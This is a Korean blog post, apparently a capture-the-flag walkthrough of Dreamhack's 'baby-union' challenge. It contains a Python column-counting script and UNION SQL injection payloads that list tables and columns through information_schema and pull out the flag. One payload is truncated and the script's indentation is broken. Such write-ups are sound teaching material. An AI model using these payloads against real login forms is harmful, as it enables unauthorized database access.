---
layout: post
title: "[드림핵][Lv.1] baby-union 문제 풀이"
date:   2025-07-16 21:00:00 +0900
categories: [CTF & Writeups]
tags: [wargame, web, union-sqli]
---


## 1. 개요 (Overview)

- **플랫폼 (Platform)**: 드림핵
- **문제 이름 (Challenge)**: baby-union
- **분야 (Category)**: 웹해킹
- **문제 링크 (URL)**: [드림핵  워게임](http://dreamhack.io/wargame/challenges/984)



## 2. 문제 분석 (Problem Analysis)
**문제 설명**
- 로그인 시 계정의 정보가 출력되는 웹 서비스이다.
- SQL INJECTION 취약점을 통해 플래그를 획득하세요. 문제에서 주어진 `init.sql` 파일의 테이블명과 컬럼명은 실제 이름과 다릅니다.

```sql
CREATE TABLE fake_table_name (
	idx int auto_increment primary key,
	fake_col1 varchar(128) not null,
	fake_col2 varchar(128) not null,
	fake_col3 varchar(128) not null,
	fake_col4 varchar(128) not null

);

INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) values ('flag is ', 'DH{sam','ple','flag}');)
    #...(취약한 코드 로직)
```

### 1) 컬럼 수 찾는 파이썬 코드

```python
import requests
import warnings


# SSL 경고 무시 (테스트 환경에서만 사용)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
def find_sql_column_count(target_url):

	"""
	POST 기반 SQL Injection에서 ORDER BY를 사용해 컬럼 수를 찾습니다.
	uid와 upw 파라미터를 모두 전송 한다.
	"""

	print("[-] 컬럼 수 확인을 시작합니다...")

	# 확인할 최대 컬럼 수
	max_columns = 25

	for i in range(1, max_columns + 1):
		# uid에 주입할 페이로드
		payload = f"' OR 1=1 ORDER BY {i}#"

		# POST 요청으로 보낼 데이터. upw에 임의의 값을 넣어줘야 합니다.
		post_data = {
			'uid': payload,
			'upw': 'dummy_password'

		}

		try:
			# POST 요청 전송. verify=False는 HTTPS 인증서 검증을 건너뜁니다.
			response = requests.post(target_url, data=post_data, timeout=5, verify=False)

  

			# HTTP 500 에러가 발생하면 컬럼 수가 초과된 것입니다.
			# 웹 애플리케이션의 반응에 따라 이 조건은 달라질 수 있습니다.

			if response.status_code == 500:
				column_count = i - 1
				print(f"\n[+] 컬럼 수를 찾았습니다: {column_count}개")
				return column_count

			else:

				print(f"[*] {i}개 컬럼 확인... (상태 코드: {response.status_code}, 정상 응답)")

			except requests.exceptions.RequestException as e:

				print(f"[!] 요청 중 오류 발생: {e}")
				return None

		print(f"[-] {max_columns}개까지 시도했지만 컬럼 수를 찾지 못했습니다.")
		return None

if __name__ == '__main__':
	# 실제 공격 대상 URL로 변경해야 합니다.
	URL = "http://host3.dreamhack.games:19347/" # 대상 주소로 변경하세요.

	# 함수 실행
	find_sql_column_count(URL)    

```

### 2)  문제 해설
- 이 문제는 파이썬 코드보다 sql 쿼리를 보는게 핵심이다.
- 이 문제에서 요구하는건 공격자가 컬럼 수를 찾아서, union 인젝션을 사용하여 테이블명과 컬럼명 찾고, flag 값을 얻어 낼 수 있느냐 라는 문제이다.
- 그래서 이 문제는 크게 3가지 단계로 문제를 접근해야 하다.


#### 2-1) 테이블의 컬럼 수는 몇개 있고, 어떤 컬럼을 출력하는지 알아야 한다.
- 처음에 컬럼 수를 확인하기 위해서 나 처럼 파이썬 코드를 작성하기도 할 수 있지만 일단 간단한 테스트는 아래와 같은 페이로드이다.

**[페이로드]**
~~~sql
' union select 1#
' union select 1,2#
' union select 1,2,3#
' union select 1,2,3,4#
~~~

---

- 이렇게 작성 할 때 주의해야하는거 upw 입력 폼에서도 아무 값을 넣어줘야 한다는 것이다.
- 그리고 위 페이로드 처럼 하나씩 증가하면서 컬럼 수의 수를 찾으면 된다.
- 이렇게 컬럼의 수를 찾으면 어떤 컬럼 위치에서 출력이 되는지 파악하면 된다.
- 위 문제에서는 2, 4번 컬럼에 출력이 되는 것이 확인 되었다.


#### 2-2) 테이블 명을 찾아야 한다.
- 이제 컬럼의 수를 알았으니 flag가 있는 테이블명을 찾아야 한다.
- 위 문제에서는 테이블명을 제대로 알려주지 않았기 때문에 테이블명을 찾아야 하는데, mysql 서버 내에는 DB의 메타 정보를 모아둔 DB가 있다.
- 우리는 이걸 이용해서 테이블명을 찾아야 한다.
- mysqli 메타정보 확인하는 건 매우 중요하기 때문에 알아둬야 하겠지만, 추후 나중에 SQL 인젝션 관련 정리를 하면 이 내용을 설명하겠다.
- 지금은 일단 테이블 명을 찾는 페이로드를 작성해보면

**[테이블명을 찾는 페이로드]**
~~~sql
' union select 1,group_concat(table_name),3, 4 from information_schema.tables where table_schema=database()#
~~~

- 위의 명령을 치면 두번째 컬럼에 현재 데이터베이스의 테이블명을 모두 출력해주는데 출력 되는 테이블은 users, onlyflag 이다.
- users 테이블명은 이미 init.sql 를 통해 확인 되었고, 우리가 찾는 flag는 onlyflag 테이블이 있는 것으로 예상 된다.


#### 2-3) 테이블명을 이용하여 컬럼을 찾아야 한다.
- 우리는 2-2에서 테이블을 확인 했다.
- 이제 찾은 테이블명을 통해 컬럼을 찾아보자
- 컬럼명을 찾는 것 역시 mysql 메타데이터의 DB 정보를 통해서 찾을 수 있다.

**[컬럼명을 찾는 페이로드]**
~~~sql
up_concat(column_name),3, 4 from information_schema.columns where table_name='onlyflag'#
~~~

- 위의 페이로드를 통해서 olnyflag 테이블 안에 idx,sname,svalue,sflag,sclose 라는 컬럼이 있다는 것을 확인 할 수 있었다.


- 이제 init.sql 파일을 열어서 다시 확인 해보면 

**[init.sql 부분]**
~~~sql
INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) values ('flag is ', 'DH{sam','ple','flag}');)
~~~

- flag 값은 fake_col2, 3,4 컬럼을 합치면 된다는 것을 알았다. 



#### 2-4) 컬럼을 활용해 flag 확인
- 테이블명과 컬럼명을 확인 했으니 이제 값을 찾는건 단순하다.

**[flag 값 확인]**
~~~sql
' union select 1, (SELECT svalue FROM onlyflag), 3, 4#
' union select 1, (SELECT sflag FROM onlyflag), 3, 4#
' union select 1, (SELECT sclose FROM onlyflag), 3, 4#
~~~

- 이렇게 두 번째 컬럼 이용해서 하나씩 추출 해도 되고, 2, 4번 컬럼을 통해서 한번에 두개의 값을 추출해도 된다.
- 이렇게 추출한 값을 하나로 뭉치면 하나의 flag 값이 된다.

---

